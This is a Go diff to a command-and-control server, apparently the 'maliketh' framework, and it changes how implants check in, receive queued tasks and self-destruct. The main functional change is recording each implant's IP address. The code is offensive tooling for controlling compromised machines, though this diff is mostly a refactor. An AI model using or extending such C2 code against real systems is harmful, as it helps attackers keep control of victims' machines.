@@ -3,6 +3,7 @@ package c2
 import (
 	"encoding/json"
 	"errors"
+	"fmt"
 	"net/http"
 
 	"github.com/cbrnrd/maliketh/server-go/internal/crypto"
@@ -13,15 +14,17 @@ import (
 
 func (h *Handler) handleCheckin() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		implant := GetImplant(r.Context())
+		ctx := r.Context()
+
+		implant := GetImplant(ctx)
 		if implant == nil {
 			http.Error(w, "Not Found", http.StatusNotFound)
 			return
 		}
 
-		// Update last seen
-		if err := h.repos.Implant.UpdateLastSeen(r.Context(), implant.ImplantID); err != nil {
-			h.logger.Error("failed to update last seen",
+		// Update last seen and IP
+		if err := h.repos.Implant.UpdateCheckin(ctx, implant.ImplantID, r.RemoteAddr); err != nil {
+			h.logger.Error("failed to update checkin",
 				zap.String("implant_id", implant.ImplantID),
 				zap.Error(err))
 		}
@@ -29,7 +32,7 @@ func (h *Handler) handleCheckin() http.HandlerFunc {
 		h.logger.Info("implant checked in", zap.String("implant_id", implant.ImplantID))
 
 		// Get oldest pending task
-		task, err := h.repos.Task.GetOldestPendingForImplant(r.Context(), implant.ImplantID)
+		task, err := h.repos.Task.GetOldestPendingForImplant(ctx, implant.ImplantID)
 		if err != nil && !errors.Is(err, pgx.ErrNoRows) {
 			h.logger.Error("failed to get pending task",
 				zap.String("implant_id", implant.ImplantID),
@@ -40,7 +43,7 @@ func (h *Handler) handleCheckin() http.HandlerFunc {
 
 		if task != nil {
 			// Mark task as read/tasked
-			if err := h.repos.Task.MarkAsTasked(r.Context(), task.TaskID); err != nil {
+			if err := h.repos.Task.MarkAsTasked(ctx, task.TaskID); err != nil {
 				h.logger.Error("failed to mark task as tasked",
 					zap.String("task_id", task.TaskID),
 					zap.Error(err))
@@ -74,7 +77,9 @@ func (h *Handler) handleCheckin() http.HandlerFunc {
 }
 
 func (h *Handler) handleSelfDestruct(r *http.Request, implant *model.Implant) {
-	if err := h.repos.Implant.Delete(r.Context(), implant.ImplantID); err != nil {
+	ctx := r.Context()
+
+	if err := h.repos.Implant.Delete(ctx, implant.ImplantID); err != nil {
 		h.logger.Error("failed to delete implant on self-destruct",
 			zap.String("implant_id", implant.ImplantID),
 			zap.Error(err))
@@ -84,6 +89,6 @@ func (h *Handler) handleSelfDestruct(r *http.Request, implant *model.Implant) {
 	h.logger.Warn("implant self-destructed", zap.String("implant_id", implant.ImplantID))
 
 	if h.publisher != nil {
-		h.publisher.PublishAnnouncement(r.Context(), "Implant "+implant.ImplantID+" self-destructed")
+		h.publisher.PublishAnnouncement(ctx, fmt.Sprintf("Implant %s (%s) self-destructed", implant.ImplantID, implant.IP)) //"Implant "+implant.ImplantID+" ()" self-destructed")
 	}
 }
